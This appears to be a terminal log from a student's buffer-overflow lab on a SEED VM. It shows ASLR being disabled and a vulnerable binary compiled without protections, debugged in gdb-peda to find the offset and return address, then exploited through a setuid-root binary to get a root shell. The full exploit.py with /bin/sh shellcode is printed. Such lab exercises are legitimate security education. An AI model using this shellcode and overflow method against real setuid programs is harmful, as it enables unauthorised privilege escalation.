@@ -1,0 +1,237 @@
+seed@seed-vm:~/practice/shatabdi$ nano target.c
+seed@seed-vm:~/practice/shatabdi$ nano exploit.py
+seed@seed-vm:~/practice/shatabdi$ sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+seed@seed-vm:~/practice/shatabdi$ gcc -m32 -fno-stack-protector -no-pie -z execstack -o target_dbg -g target.c
+seed@seed-vm:~/practice/shatabdi$ cd
+seed@seed-vm:~$ cd practice/shatabdi
+seed@seed-vm:~/practice/shatabdi$ sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+seed@seed-vm:~/practice/shatabdi$ gcc -m32 -fno-stack-protector -no-pie -z execstack -o target_dbg -g target.c
+seed@seed-vm:~/practice/shatabdi$ cd .
+seed@seed-vm:~/practice/shatabdi$ gdb `pwd`/target_dbg
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from /home/seed/practice/shatabdi/target_dbg...
+gdb-peda$ unset environment LINES
+gdb-peda$ unset environment COLUMNS
+gdb-peda$ set exec-wrapper env -i
+gdb-peda$ b process
+Breakpoint 1 at 0x80491f6: file target.c, line 15.
+gdb-peda$ run
+Starting program: /home/seed/practice/shatabdi/target_dbg
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffdc01 --> 0x4080481
+EBX: 0x804c000 --> 0x804bf14 --> 0x1
+ECX: 0xfbad24a8
+EDX: 0x0
+ESI: 0xf7fb3000 --> 0x1e8d6c
+EDI: 0xf7fb3000 --> 0x1e8d6c
+EBP: 0xffffde18 --> 0x0
+ESP: 0xffffdbec --> 0x80492b6 (<main+135>:      add    esp,0x10)
+EIP: 0x80491f6 (<process>:      endbr32)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491e9 <__do_global_dtors_aux+41>:        lea    esi,[esi+eiz*1+0x0]
+   0x80491f0 <frame_dummy>:     endbr32
+   0x80491f4 <frame_dummy+4>:   jmp    0x8049180 <register_tm_clones>
+=> 0x80491f6 <process>: endbr32
+   0x80491fa <process+4>:       push   ebp
+   0x80491fb <process+5>:       mov    ebp,esp
+   0x80491fd <process+7>:       push   ebx
+   0x80491fe <process+8>:       sub    esp,0xe4
+[------------------------------------stack-------------------------------------]
+0000| 0xffffdbec --> 0x80492b6 (<main+135>:     add    esp,0x10)
+0004| 0xffffdbf0 --> 0xffffdc01 --> 0x4080481
+0008| 0xffffdbf4 --> 0x1
+0012| 0xffffdbf8 --> 0x20b
+0016| 0xffffdbfc --> 0x804d1a0 --> 0xfbad2498
+0020| 0xffffdc00 --> 0x80481b4 ("/lib/ld-linux.so.2")
+0024| 0xffffdc04 --> 0x4
+0028| 0xffffdc08 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, process (str=0xffffdc01 "\201\004\b\004") at target.c:15
+15      int process(char *str) {
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804c000 --> 0x804bf14 --> 0x1
+EBX: 0x804c000 --> 0x804bf14 --> 0x1
+ECX: 0xfbad24a8
+EDX: 0x0
+ESI: 0xf7fb3000 --> 0x1e8d6c
+EDI: 0xf7fb3000 --> 0x1e8d6c
+EBP: 0xffffdbe8 --> 0xffffde18 --> 0x0
+ESP: 0xffffdb00 --> 0x22aa9515
+EIP: 0x804920e (<process+24>:   sub    esp,0x8)
+EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80491fe <process+8>:       sub    esp,0xe4
+   0x8049204 <process+14>:      call   0x80492da <__x86.get_pc_thunk.ax>
+   0x8049209 <process+19>:      add    eax,0x2df7
+=> 0x804920e <process+24>:      sub    esp,0x8
+   0x8049211 <process+27>:      push   DWORD PTR [ebp+0x8]
+   0x8049214 <process+30>:      lea    edx,[ebp-0xe7]
+   0x804921a <process+36>:      push   edx
+   0x804921b <process+37>:      mov    ebx,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffdb00 --> 0x22aa9515
+0004| 0xffffdb04 --> 0x6a65c89b
+0008| 0xffffdb08 --> 0x22aa9515
+0012| 0xffffdb0c --> 0x6a65c89b
+0016| 0xffffdb10 --> 0x22aa9515
+0020| 0xffffdb14 --> 0xf7fb1960 --> 0x0
+0024| 0xffffdb18 --> 0xf7fb1a74 --> 0x0
+0028| 0xffffdb1c --> 0xf7e43113 (<_IO_file_underflow+371>:      add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+18          strcpy(buffer, str);
+gdb-peda$ p/d (void*)$ebp + 4 - (void*)&buffer
+$1 = 235
+gdb-peda$ p $ebp + 8
+$2 = (void *) 0xffffdbf0
+gdb-peda$ q
+seed@seed-vm:~/practice/shatabdi$ nano exploit.py
+seed@seed-vm:~/practice/shatabdi$ python3 exploit.py
+badfile generated successfully!
+seed@seed-vm:~/practice/shatabdi$ cd .
+seed@seed-vm:~/practice/shatabdi$ env -i `pwd`/target_dbg
+$ exit()
+>
+zsh: do you wish to see all 1687 possibilities (844 lines)? n
+> q
+$ q
+zsh: command not found: q
+$ exit
+exit:4: command not found: q
+$
+$
+$
+$
+$
+$
+$ Connection to 20.205.97.7 closed.
+PS C:\Users\A> ssh -i C:\Users\A\.ssh\id_rsa -L 5901:localhost:5901 seed@20.205.97.7
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1089-azure x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sun Jul 26 09:04:17 UTC 2026
+
+  System load:  0.0                Processes:             130
+  Usage of /:   16.3% of 28.89GB   Users logged in:       0
+  Memory usage: 5%                 IPv4 address for eth0: 10.0.0.4
+  Swap usage:   0%
+
+ * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support
+   on 31 May 2025.
+
+   For more details see:
+   https://ubuntu.com/20-04
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+10 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+272 additional security updates can be applied with ESM Infra.
+Learn more about enabling ESM Infra service for Ubuntu 20.04 at
+https://ubuntu.com/20-04
+
+New release '22.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Sun Jul 26 08:25:48 2026 from 103.230.107.38
+seed@seed-vm:~$ cd practice/shatabdi
+seed@seed-vm:~/practice/shatabdi$ cd .
+seed@seed-vm:~/practice/shatabdi$ env -i `pwd`/target_dbg
+$
+seed@seed-vm:~/practice/shatabdi$ sudo chown root target_dbg
+seed@seed-vm:~/practice/shatabdi$ sudo chmod 4755 target_dbg
+seed@seed-vm:~/practice/shatabdi$ env -i `pwd`/target_dbg
+# whoami
+root
+# ls -la
+total 48
+drwxrwxr-x  2 seed seed  4096 Jul 26 09:02 .
+drwx---rwx 15 seed seed  4096 Jul 24 15:52 ..
+-rw-------  1 seed seed   140 Jul 26 09:01 .gdb_history
+-rw-rw-r--  1 seed seed   264 Jul 26 09:03 badfile
+-rw-rw-r--  1 seed seed  1226 Jul 26 09:02 exploit.py
+-rw-rw-r--  1 seed seed    39 Jul 26 08:59 peda-session-target_dbg.txt
+-rw-rw-r--  1 seed seed   872 Jul 26 08:56 target.c
+-rwsr-xr-x  1 root seed 18228 Jul 26 08:57 target_dbg
+# exit
+seed@seed-vm:~/practice/shatabdi$ cat exploit.py
+#!/usr/bin/python3
+import sys
+
+def p32(x):
+    """Pack a 32-bit integer in little-endian format."""
+    return x.to_bytes(4, byteorder='little')
+
+# Shellcode to spawn /bin/sh (25 bytes, no null bytes)
+shellcode = (
+    "\x31\xc0"
+    "\x50"
+    "\x68""//sh"
+    "\x68""/bin"
+    "\x89\xe3"
+    "\x50"
+    "\x53"
+    "\x89\xe1"
+    "\x99"
+    "\xb0\x0b"
+    "\xcd\x80"
+).encode('latin-1')
+
+# ============================================================
+# TODO: Fill in the values below based on your GDB analysis
+# ============================================================
+
+# Total size of the payload (should match READ_SZ in target.c)
+read_sz = 100+123+300              # TODO: Replace with your READ_SZ value
+
+# ============================================================
+# TODO: Prepare your payload
+# ============================================================
+content = bytearray(b"A"*235+p32(0xffffdbf0)+shellcode+b"\x00") # TODO: Prepare your payload properly
+
+# ============================================================
+# Write the payload to badfile
+# ============================================================
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+print("badfile generated successfully!")
+seed@seed-vm:~/practice/shatabdi$ cd .
+seed@seed-vm:~/practice/shatabdi$ env -i `pwd`/target_dbg
+# whoami
+root
+# ls -la
+total 48
+drwxrwxr-x  2 seed seed  4096 Jul 26 09:02 .
+drwx---rwx 15 seed seed  4096 Jul 24 15:52 ..
+-rw-------  1 seed seed   140 Jul 26 09:01 .gdb_history
+-rw-rw-r--  1 seed seed   264 Jul 26 09:03 badfile
+-rw-rw-r--  1 seed seed  1226 Jul 26 09:02 exploit.py
+-rw-rw-r--  1 seed seed    39 Jul 26 08:59 peda-session-target_dbg.txt
+-rw-rw-r--  1 seed seed   872 Jul 26 08:56 target.c
+-rwsr-xr-x  1 root seed 18228 Jul 26 08:57 target_dbg
